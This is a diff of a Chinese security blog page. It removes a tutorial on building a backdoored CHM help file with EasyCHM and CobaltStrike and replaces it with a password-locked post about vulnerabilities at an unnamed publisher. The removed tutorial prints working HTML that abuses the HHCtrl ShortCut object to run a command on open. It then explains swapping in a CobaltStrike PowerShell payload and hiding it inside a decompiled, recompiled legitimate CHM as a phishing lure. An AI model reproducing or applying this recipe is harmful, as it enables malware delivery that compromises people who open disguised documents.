@@ -15,29 +15,17 @@
 <link rel="stylesheet" href="/css/tags.css" media="all">
 
 
-<meta name="description" content="Chm简介类似于一款用于存储信息和图文的帮助文档，里面可以集成很多页面，由html渲染而成，通过调用Windows中的hh.exe来执行。">
+<meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CobaltStrike实现Chm后门">
-<meta property="og:url" content="https://www.tu3k.cn/2021/01/08/cs-chm-online/index.html">
+<meta property="og:title" content="某出版社漏洞大礼包">
+<meta property="og:url" content="https://www.tu3k.cn/2021/01/11/chubanshe-bugs/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="Chm简介类似于一款用于存储信息和图文的帮助文档，里面可以集成很多页面，由html渲染而成，通过调用Windows中的hh.exe来执行。">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/1.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/2.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/3.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/4.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/5.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/6.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/7.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/8.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/9.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/10.png">
-<meta property="og:image" content="http://www.tu3k.cn/images/Chm/11.png">
-<meta property="article:published_time" content="2021-01-07T18:28:43.000Z">
-<meta property="article:modified_time" content="2021-01-07T16:43:28.475Z">
-<meta property="article:tag" content="CobaltStrike">
+<meta property="article:published_time" content="2021-01-11T03:08:50.000Z">
+<meta property="article:modified_time" content="2021-01-11T03:30:22.751Z">
+<meta property="article:tag" content="出版社漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://www.tu3k.cn/images/Chm/1.png">
 
 
     <link rel="icon" href="/images/favicon.ico">
@@ -71,7 +59,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>CobaltStrike实现Chm后门 | Tu3k's Blog</title>
+<title>某出版社漏洞大礼包 | Tu3k's Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -280,11 +268,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-cs-chm-online" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-chubanshe-bugs" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/01/08/cs-chm-online/" class="article-date">
-      <time datetime="2021-01-07T18:28:43.000Z" itemprop="datePublished">2021-01-08</time>
+      <a href="/2021/01/11/chubanshe-bugs/" class="article-date">
+      <time datetime="2021-01-11T03:08:50.000Z" itemprop="datePublished">2021-01-11</time>
 </a>
 
 
@@ -299,7 +287,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      CobaltStrike实现Chm后门
+      某出版社漏洞大礼包
     </h1>
   
 
@@ -310,7 +298,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%87%BA%E7%89%88%E7%A4%BE%E6%BC%8F%E6%B4%9E/" rel="tag">出版社漏洞</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -320,17 +308,18 @@
 <div class="article-entry" itemprop="articleBody">
     
         
-        <h2 id="Chm简介"><a href="#Chm简介" class="headerlink" title="Chm简介"></a>Chm简介</h2><p>类似于一款用于存储信息和图文的帮助文档，里面可以集成很多页面，由html渲染而成，通过调用Windows中的hh.exe来执行。</p>
-<a id="more"></a>
-<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="Chm钓鱼后门文件制作——打开Chm就弹计算器"><a href="#Chm钓鱼后门文件制作——打开Chm就弹计算器" class="headerlink" title="Chm钓鱼后门文件制作——打开Chm就弹计算器"></a>Chm钓鱼后门文件制作——打开Chm就弹计算器</h3><h4 id="需要用到的工具："><a href="#需要用到的工具：" class="headerlink" title="需要用到的工具："></a>需要用到的工具：</h4><p>① EasyCHM<br>② CobaltStrike</p>
-<p>先安装好EasyChm，在桌面建立一个新文件夹名为testchm用来存放木马payload，单独一个文件夹为了方便后面在EasyChm中去打开这个项目，payload框架为html</p>
-<p>html源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Chm Calc Test&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;command exec &lt;OBJECT id&#x3D;x classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&#39;,payload&#39;&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;x.Click();&lt;&#x2F;SCRIPT&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<p>这里的payload即为我们cs或msf生成的payload，这里以calc.exe来测试<br><img src="http://www.tu3k.cn/images/Chm/1.png" alt="calc" title="calc"></p>
-<h4 id="进行编译："><a href="#进行编译：" class="headerlink" title="进行编译："></a>进行编译：</h4><p>打开EasyChm，新建项目，文件夹为刚才创建的testchm文件夹<br><img src="http://www.tu3k.cn/images/Chm/2.png" alt="testchm" title="testchm"><br>背景是打开后的页面，确认无误后点击编译，(和C语言差不多，编译——&gt;生成可执行文件),就会在上级目录生成一个testchm.chm<br><img src="http://www.tu3k.cn/images/Chm/3.png" alt="testchm" title="testchm"><br>双击运行 成功弹计算器<br><img src="http://www.tu3k.cn/images/Chm/4.png" alt="testchm" title="testchm"></p>
-<h3 id="CobaltStrike配合上线Chm"><a href="#CobaltStrike配合上线Chm" class="headerlink" title="CobaltStrike配合上线Chm"></a>CobaltStrike配合上线Chm</h3><p>CS生成ps payload<br><img src="http://www.tu3k.cn/images/Chm/5.png" alt="cs_chm" title="cs_chm"><br><img src="http://www.tu3k.cn/images/Chm/6.png" alt="ps_cs_chm" title="ps_cs_chm"><br>将payload把calc.exe替换即可，这里要注意，exe后要加个逗号<code>&#39;,&#39;</code>，而且ps代码里的双引号和html里的单引号会起冲突，将ps双引号删掉，html单换双即可<br><img src="http://www.tu3k.cn/images/Chm/7.png" alt="ps_cs_chm" title="ps_cs_chm"><br>没啥问题，编译，运行<br><img src="http://www.tu3k.cn/images/Chm/8.png" alt="ps_cs_chm" title="ps_cs_chm"><br>上线即可</p>
-<h3 id="正常Chm文档伪装上线"><a href="#正常Chm文档伪装上线" class="headerlink" title="正常Chm文档伪装上线"></a>正常Chm文档伪装上线</h3><h4 id="流程：将一个正常的Chm帮助文档反编译成html源码，然后在html源码中插入我们的payload，重新编译，运行"><a href="#流程：将一个正常的Chm帮助文档反编译成html源码，然后在html源码中插入我们的payload，重新编译，运行" class="headerlink" title="流程：将一个正常的Chm帮助文档反编译成html源码，然后在html源码中插入我们的payload，重新编译，运行."></a>流程：将一个正常的Chm帮助文档反编译成html源码，然后在html源码中插入我们的payload，重新编译，运行.</h4><p>测试文档：之前看的一个关于星外提权的文档（星外提权.chm）<br>先使用 <code>hh.exe -decompile .\\html 星外提权.chm</code><br>将chm反编译，源码在同目录的html文件夹下，然后选择一个html文件编译 插入我们的HTML payload框架，注意要记住这个插入的html的文件名<br><img src="http://www.tu3k.cn/images/Chm/9.png" alt="ps_cs_chm" title="ps_cs_chm"><br>首页和显示页要设置存在payload的文件名，这样一打开就能运行我们的payload上线<br>编译<br><img src="http://www.tu3k.cn/images/Chm/10.png" alt="ps_cs_chm" title="ps_cs_chm"><br>运行成功上线<br><img src="http://www.tu3k.cn/images/Chm/11.png" alt="ps_cs_chm" title="ps_cs_chm"></p>
-
+        <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="8b1921929cb0a16b5b4ceaf6b857ea139dc929487fd26e49090af600fb0acdf6">e029220b767d7536ceb491359e81721774f22cec3ea8fdfd399440b8dc1e3bbc9f468c55968efb1192be76cfe7219e73030fe5a188133d04bb6f09682c57e9e34327a350ed165df4c9901a7ef4b4f19db0ea57b51337c5e8d8c11be4af957792716e9dd021cfd33bf917a4cb5f183278aecf9fb33046cdedbd681bc97398dbe6a4f3ff58cea0ea2a7a73f96cf246f2ff44813432ed83ed505e14e593b9c07b79fe21e33b693e9a05e7372d23db66e04a97db7e06a17895eecb4a5438fb4570628c8f5b1d208c8222e8b494f6cb8c5aac9d2cb5b499f112955a3f0bfd11762fc5573832cf848b7f18d52823c9057ea707653504504341619a372e97158736d713e448e351c43572cf53c28e38e6fd871848a23f53044f1a9772ddecbedb8599e4cf2ff82e5c9c92b2c7febc1b0da6ea21d4b90f2c112eeddacf7fcfa79a925e473336ae1251ad5c8d6beabc874482f929f7d5e77300615c2eee09330f90b7717ea63b2b7c237aa5c93726fedaee0462030ede5f87d21e36dd522d92489afe6704d453df676699f052ea515be1a4afbee22fa0ff7b59356018855ac7d26539c6ea4265d12bb3f0094ce5050bedd378036c2a3a372353e183cd521fbd92f4452e6681d2c83a5b1543cc78ff65cb0724236d9675921226a6716005c173cabd7a347ed947bfab9053fa36e47cdfa80a1df30762d58d8661889f685cbdb50f438e95203f5102a9d85e45de637e97255728f5142d31eb938ffe444d11821e3b4048eecc9895ba885ff112300082d1caa33d3a9182673bb8e9b0f0a29dff1f024fb210e2e6e47c8d22f4634f530bd59259cf3fddcb38b2e6322d8684b627f9fbdd936692a1562d82881f309eea6449e7bb8b89773cda2ccc76a1b3d64fc72e03e81d2c3e30c96ab7b44314ff0b17d29b1aebb53df57bd6c818ba776bdee6203f7e26632a1ba4a5a7ea3b886bb835936200aa6c202f917dfdd0d3e0b0fb4fea17af7c8c5f5251a975ce9da779ed3568ce32738e39f4eb223035e79c045768019839ef26638502405812bd73c5dfebb01264b44e05408cb2e4c8f7ec59aec0e85e22ccb6487bb174711b8e8ca5eda8f370536dfd60e87df9356809c1026ff927b6e4e813a63554e372997781f67d52aab2e71b747e175df68f70b8efc84e3add9581bde970f64c5f9583f25d2cf071d5de29e4bde1d7d8e72ca49f6843b6c5079b136adbaa394a3a704d30edc8e4323f0d36edcd44c42aeea974909e85fb27b4570a2de52784752a5014e14114ddf2f1e29fd6a4d80fca200641c95610702d7927b69532453b9a72560b5fcae325b1800c12f4cedf2f1b345af4ca027fb81a8d9b5c63787ce9cd9ced1f1f6e1b5fa568a21248da947b3eab6cda3c112997ed7f812c9fabad0f71700b95bb021bdcee146b8c49b268c341d83e94e78d3c81c05b673b89360ce96d8a5e7a21939981055ca23eeec506f97c43cbc5a3ee4c231f1e4a7430149723ead4de73136ea1a78143b7195ae736fb55ed3ee5ee1d8e12fde228463dbebec608fd1193ce269b5843f4f923e1a8ee6040f19cc27f10c5cc7cf0454a138cccfb13056b82e4f99524519bbf21c7d0910dac6b1d7d06b3d2311f55f0432c011db2e5068650956e64cbfc4a22f734aa81778292cb9e549572250b511b09ad85f20d8de63b9ad23e11e414b7ea028fe1b848f25e98b7da4baaf3399a9ddae7cb966ccae0f295faf101a0ba42fc6199ae52fe666540bc078826713581ee774728294d45cde49e7bbf1a734f939378bb82c22c8f75b0c6ddd3a4670b317c0c27cbbadbfda3a4be6cd930a076b51b96e303c7193b30df5925275e897975f2e115e8a07800f602e585513cfe1234b5de034fb68ea196b976fac9393c381a99e3d757dfa05320433eeeea7c6b778a0fb4881e8373f598ac4897b624ede1183de6a4503be36478186c66c701226862026e7ef4bea47c6076b8a20e68b94ffb2cc1578b1078c7fa24f781a622c4b20a437d9cc8ab1ce834bbb7437bdc0d01a8ba9db392ccf8f6972541cdb5a55dc4ca937e2025adb99eb495f7801fbf2fa856bc44be528c274a146a4e28ac83d23cd9ac17e26b5657bde9d4d83b84f1b6cba616b4789f8f40999a0e4a384601661ed3813c020e0915085dc73c963cbd6d50b31493f3ef748c833066af11f1c74f0c666a6200ba767c9302a7be7702c7fbba2291a9c72377f0b3baabea4cab05d48274452295a541e91b2eadb71121fe8be469d55dc16c894a3cf4b82047d7f434997b100215a8e50e91bd03c586b35621c0ccc4261b5d22f415cf8ef45c61f485ea219916733ced983b1188d6741dea3d458968e3ac19862db802e35ebde67360339c5cde5db53b5e0b27cbdb5855713a14e16168b2383499b0cb0842f2eb4865c0327089ee31635829111b6468da66016e9efcdec6fe4e656ae7f451353c58d2fae2fce83b1074ba494650f31549a6684427f2be44c43f95111d3676067fff7b9232fd7fb4794ae66de4c88322f5e62aedc365d0aeaf5d296586b41432204ad029fa93b093ab55454d2ace7661cb259d3e4c61befde6e067f22c269b7320c70a0bc5e7463f42918f8248d218da20a2bc92250ff7aa9443c55ef6280a5e4dc3eb7882d82acfe7d9a165e1f11a26e7474412d7f99b5ac87bbe8b79cbaeb81f8a2141c0340953320eae9e29a86cb1a6bd959fb737191717005beae6bebc2e9e63de6ef9aba7d243755623d8fe2006f17138dc981f0cd2f11fb89e9097fac2fb0547a354b79081a993422931a715754085b45dfe07ddbc47c81a94a05f3f000339dc7e1a782196cb3b5467cac2a292781a08717db5a45947c488250e5d222c812739fc60e10f908b51bc2419886848223a56306ed16308c7d47a23e2a73fd1fec86b27dc8238ca2f252e9fd0fde2c8e9818b314f89dab36796599b6cca55702f118116d0341a1e315dc5deedaefc30e178b20df6e514a74bc294ef5fda6fdf93480828cf505dc28770fea973e68df4d65c4965328dfe98a9ade62c28be9c6c9a2345c69b845bfd85e810175da4234ebbf76a6b5bd811f2c981515833b3103a918ffc4472b8b5b0b252c2b2771d42c4f575cd2ce5809ef11d1f1c512a1dc314d51aefd012b4e79802685162f9f3a3daf7063fd421c92b63378ab3259689efe359fa146949bf3f4f9c25c8a5fbed30871b55581c2f89eb2c00e047d7a8dad58575f33d96a286100856b1c1d3b13da9f97b52f75a26bbca0933c7b194265e4427491e438b4a41988b14d7a85e1782889a68c2817c1229e43c69f6234a7c58e23d447d40c037b23f38c577bb9a86feafca6df645b635e084d387b2cb2db939f6654d3dfccdf3cab2fe5e7f1d44bdc2e0f004a25095f8b1b2475688ae40a4530713a3c0414c91e45ecfe0d9e93d7ce0a4c5bbacf44d72751849d3b86628c23fd34681b2c3b4e1c8231c6cc3604b03f203155aab9a4fe5a89ea43696bb284a5bf3e92e6aa3e7ccea4405031f9a31ae94f5a5e12ef935e4edb0e9ba553441cd7f5995abe3a430a0144ee72597a89d4d13d66545a9244e82bddc25c56b7a418c7aafe7e773095c0531e53f4aa7109c972c5ccf298e3da4611ad34f7dd9174dff675f234234a41403dc7c62214987711ea4af35c3cd34a28ee8c18070921ceeb158d3310d30f41ae2565a7b2935b29694db4e1f2cbfdb7af48e0b4d25521db2e66958b2e06abb5e255419ae97448d3de648a40bd2a09461ffde4afa3825b836bf6808c1d971f5803aac84a7d7dbbfaf557bd582ca4e2b3dd44afc8875eb4b2b8f548c2490ed30912b9cdf8bfb2f963bd8f6ffc17754f8d5e2244a1712689b63389bfdc7be30ff53b5ed30b0a191e4dbc1a9777192ea68608235aa1f104765986ee5d7c882d22f90913add9263ee0453db790d23c3a688694e9917f5f226d6bb85bbaeb0a0ec6bab9a1c01fb25e699e6a5ef7088eeaf12e83376c63622b116302fa0c4f3cf2a7ff86723c860334382f3afbd0b7f20031fdcb37d9a30ec8aa7b65c29fe38b49c3918cb224b2a197e5060e3a96f98d7dd0d32fd539a10d01f37904a95176b0219c5bfb78da018b5667cbab16956bf22f23c6cd6796b94607256707f2975850b2b3494751019b0f8d9b3afec7b8cab69e06ef184f16c6e9f444bd21ff501deb8a488efe24f743636afbc0a10a5a150728a487b5ad7d76972d347f3ceb21cba53ce5ebdcb6352d127880798e33bf6adb58dc586e5216b3cbeaf524530c7d6243c889f9a8d2076899c079f600922d72f656831d89b0b5099e18a406d3a07085577a3b831b1bb3aa547eed55acc4928a17f64828189e1757dd5661e33bb6cdbfb184630bf2939dbac650d54d0aed911bae87af1012c4cc18e22db6de51e1930a12b7747f4bb9a944e396b198a68eba627c5e7e7a8f36423d2a510c6a5992dc160a8937b148bddb5326d2b60583e87196b6d0bb036d9d250fc03957ce0c54205bb5c4a68aeeb5b0b45fd836ef5b7d27fcaa9606c0ed1f88f75c34fd2d3ccc12b31863a46e31b4d301e582c8786c1dd5a65bf48653da54435d18513962835a7904dbafcb039b63a55e14535bc1ad2b3d46a214a6e93755f5c435d56d6f3e181e57b9a7ba647c004b9ac802c626f77744d59dda5c2cf3050c48a9e3a0f9d90a143fb382de2e5b460f19d29f74fee8474cc19179a2a127bfa5ebb80cee5fd6a099ae6c14ef71237318c1b9526b12fa7d1cb57beadf223cdedf8edfd555fac21a75d4ff52eee4b54f6b05786a126e8deceb52780e495423c6894b3650d4d6ec21498671002b16a47d7de483aa1025b21702add1f5fa43af8a8fb2378899edc406b1c1cadef9907791ef1c02a7a8a69931d7dae47a4575bc7c826b5decdaabc22d6b798bdf5fb01321ee09eb7f62b5c1306791f0de8294fe9331b6cb0e69c3bc77d76063607afc6f27b283984057a9e532704e3fdab172f3c7fe95b72e264cc462f144af2f4863215591a6463d4de2bacf7a463677255bfe5819cc1e72229886636d46bde5f8cbe49ae6eb30122edc07e8514f0927a9d43d7a515d5f34478cc9f90126992303d0c3f1935aa4e7b4f4ebe3ddc62b77462e9918fe1db894ddc93a707c8ba63d6e357133a5217ae30bedcb2fe4102b9f88b7b5bc5adb35ecd4cbae9d179e38f34df0a145085b25de77b405036c842f7e37783a16403411ae6c238f216cdcf66471cf8465e94e6e928f81a44c53fb1d61f9563cb90d5e310afb153bf34c353a3d129771f593038a1e7730fce2aa201652fc91679d8ffb307e980664116992ffd4b7b2151cc517d6a40cfc0b24f8400a7c8dcbbe2aecf4ae5bc371a8791bbbc4ab3d575d38b9e13a89f4bc1a4af41549c4055c622ce71c4fed37048a002e58cff39b22ccbc0ae798be94f5e75788c61dd943d05ee0d0468152719abd8e0feb8ab0767482dfadf8898488350350210e75d9b2ae99a952f257a3255dc600a3beb40c53bce5a21b42ff32b06cf6574eb81df5c69267964824af169102f0e6471082a2a787f4e5b2941e2121a22a455640a63147bcc5e5e75ea3533b04343d08c7d8b850a84b362a9da4ae4bcf4131c45375c14781392f55d4d7a5bec1a4ed5c9067a261e10624ea7628a7be90c3e0cab6249280a7d29cecd9a9cbb0a6cb3bc932a68d88beea47e1493d33edcb0050b47615d17474584a213364b84a423b1d6e42a4ddf627124a32af39e7ee1eb09184e0cf2ce8cef4e5657ae6856075040e0074d9dc1d4a3a6055fcae91cbe3a61d56eab7910d12c40d6f7b52c1fc1baa8e50056da6e55212a7cd96baf8240c118c05c85d4ee7f79f45e082eac762c5619bca8f9ec3fcefb71836f197e0bd3033a165a03f9c089be7a2dcdb4c2344e70a4fb0eba6804856452f543aaea046792968624556a961fc8db5c7c0ceec2e14ab0ded20761c309897f5db072e91cab2be745c19af99c7cc4dec0fa8625b520762f43d644278303e0789145dd9075aad19d41ee315232d2f6f3e9de3380a90b8707efdfd59cb14f6a064433e014d3d446884a7bf418681ee8e0a2ea1b42c4246d7b19ca175e3f73d7a031494e5245697a2ce251f88896f6e046c0b2334ec463144cf47b2ee0966d61efef2ba8e313e2dc3e4f1b9b3ff1da1ebbfd0a26d44cb358fe529cd757f4f69e3cf270dad8d25570212febce0ddcc09fb3c5b744e5d0e0e3c882c711ad74f7a14acd508f89a8c47f0e2344426babd6f8db91d34439d4c6482a10fd4f7f5a2777aee9c5e38a4c9fb122b3e36f7ece8d0dc442daccdce8ee4d38306de3cf940c7dc6b693c85a82a778c293b07e745c06969d6296f740b31820bd6cb184ec254a048f55f7e94e03469dc94005c5d20d7abfe6d660b5b8557076eb973e94b207a616d0a0407e484072ffe81e7459c1f7fd10e3dd93e07af231061c9e6331d62cac1d3180f2f777bdc61791c7d3a3c2e17022763a17209a1a7078038a9bd0ec1a8c896e882e1ab686ca1e0ca8a0eacccd7f02b15aa458454eda5e2cc2166efa5eb6e5d3b9b159117e6599555b656d7c11932a7cc76946e54d218b317543201f03f15668ab5a841dd53c626af4de8e19e8631d7c8094b932571ae7154c14ee22438febe2f6219d5704bdf73afa01eb292ae027087d791f05d83bf5fda71c10ee8955f63dff24df171fc3f4d9749d0abddcde96f3d87a26f457401800972e60a31cfbb8621c0dae000f70ca40252ca174104e411a6a68dc13be4f31e705bbdfca8f75657fde54bc9d34ed5c96f947f2fe034a0f3e4c492f3d7d65a13e091d167035944e1aedbf4dd140ec6023586b56d1e592250d36cb7d22cdbc0e94578c2f7337fb21f28ce303b0990cfad86b1e5aee2abefc5738b53d19330639adfc9709363befc1164210f5e88e9fb987b3710628b3348a7b1ce65379fa4ea3b5382f46b26f69c4d69d62b603536e639e1e6903671393c5b519947efbfbd791b0fe7f260c4b89e3c775d866dc7a609a2fd73993b132534da09f5c53b8f46ef259709514f79dfb898d7dccb1ea192073c5b359088336f400d0109802cfbab72cd354a7902e14bf6332b5f62db7b98747e36550bc8f13474204f5ad8d043de51677fe1f1b75d6ddaad6c264384ffb8e08288c14ea3e276af61bf1300e1f5a0522f097cb5b43b53898f5761a25b10b0925a8bb0fadc4e698c1eb8ede80c28df91d4307a304ce1ab4a7bbc87a2f3a86028769e13d7e5602b4f864502d13ae4eb56ef7da98402214ba689e43e49dc205be949b9b67e92e9674f4160083447d89b67c682732a84eb4becccf31cbdd851fd1ed532b06d9b111b09eaf71a2fc591ccd714ed3f33f8335a35455c7885c1689e34cac953eb401f1fcd619677cb41491f62e16d998cacb929ddb0ead90f691c7bd936598a0081e1f1200657d5c473006bf373d5fd5ad3f1109c28021866953e0ab2d4da54a7c18b1f0681e0b5502616b410ff7cec751c33f615176d3e5ecf1a0f3e0b2528e61d7aa791cd9a98e1237c2b21ae9acb9ffcc792ceab4cd3ac670af1be70268a8f4e09188d2d081e000dd6b9e03ad4236c7cfe7a2435bc4d6eb9d7faffb5d12ec590a78c2ff4029202d1fc5305fad22001f1feba26c5b7f2b2deaabb2cfaad75a991b55313ec8510fd9bd89cec516bbd0446fb2cd1a8a819a0a414bd2bcaf776d20dd5f3f3520f2896756579fa42980091febd87032db6ae74c689b0556b37e460465d02248550ba8a487516f1720fe8e60398738ffeb2460b1702ee8417875aa92e1bd75d0913c2fcd277a36f1e3bc18cffc39cccbb1e6fd5b675d60c13e07093a0c1e338176ce9393a137399a555fdde4989f5e76ee4aced784cb7d3b7cc369ee793d5973b9cc02e2d56d90c52f7ef45a6d9fcdfa9ae0e74075b502504bc876d2313797c6c31a2149682efb4f9c46b1dd7b5e1aa7360b75545e64d227edbc1bde1e8816d3f20a71743dbb1a10a00a722b01cfa58a828c82d6da77040a87d1a7fe386bd5efec0e9e79e86b41e0268e89148379fe50519c0bca131a242b99255a7c6290d4e3acf576fbdeb3d581237309aca7bf488bf064ce2990fe01eb9e591b9705813cd51c4a44dc249a8afdd4d2bf7491c5489fdcd2022b2aab8bc2a973e08108a4b9d5860e74bae611</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码宝贝</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     
 </div>
     
@@ -338,13 +327,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2021/01/08/cs-chm-online/">CobaltStrike实现Chm后门</a></p>
+        <p><span>Title:</span><a href="/2021/01/11/chubanshe-bugs/">某出版社漏洞大礼包</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
-        <p><span>Created:</span>2021-01-08, 02:28:43</p>
-        <p><span>Updated:</span>2021-01-08, 00:43:28</p>
+        <p><span>Created:</span>2021-01-11, 11:08:50</p>
+        <p><span>Updated:</span>2021-01-11, 11:30:22</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2021/01/08/cs-chm-online/" title="CobaltStrike实现Chm后门">https://www.tu3k.cn/2021/01/08/cs-chm-online/</a>
-            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/01/08/cs-chm-online/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2021/01/11/chubanshe-bugs/" title="某出版社漏洞大礼包">https://www.tu3k.cn/2021/01/11/chubanshe-bugs/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/01/11/chubanshe-bugs/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -356,16 +345,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/01/09/74cms-tempelate-log-include-shell/">
-                    骑士CMS 模板文件日志包含Getshell
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/01/07/redis/">
-                    Redis未授权访问
+                <a href="/2021/01/10/sc-powershell-serivces-yincang/">
+                    SC实现隐藏Windows服务维持权限
                 </a>
             </div>
         
@@ -377,7 +360,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chm%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Chm简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Chm%E9%92%93%E9%B1%BC%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E2%80%94%E2%80%94%E6%89%93%E5%BC%80Chm%E5%B0%B1%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">2.1.</span> <span class="toc-text">Chm钓鱼后门文件制作——打开Chm就弹计算器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">需要用到的工具：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E7%BC%96%E8%AF%91%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">进行编译：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CobaltStrike%E9%85%8D%E5%90%88%E4%B8%8A%E7%BA%BFChm"><span class="toc-number">2.2.</span> <span class="toc-text">CobaltStrike配合上线Chm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8Chm%E6%96%87%E6%A1%A3%E4%BC%AA%E8%A3%85%E4%B8%8A%E7%BA%BF"><span class="toc-number">2.3.</span> <span class="toc-text">正常Chm文档伪装上线</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%EF%BC%9A%E5%B0%86%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E7%9A%84Chm%E5%B8%AE%E5%8A%A9%E6%96%87%E6%A1%A3%E5%8F%8D%E7%BC%96%E8%AF%91%E6%88%90html%E6%BA%90%E7%A0%81%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8html%E6%BA%90%E7%A0%81%E4%B8%AD%E6%8F%92%E5%85%A5%E6%88%91%E4%BB%AC%E7%9A%84payload%EF%BC%8C%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91%EF%BC%8C%E8%BF%90%E8%A1%8C"><span class="toc-number">2.3.1.</span> <span class="toc-text">流程：将一个正常的Chm帮助文档反编译成html源码，然后在html源码中插入我们的payload，重新编译，运行.</span></a></li></ol></li></ol></li></ol>
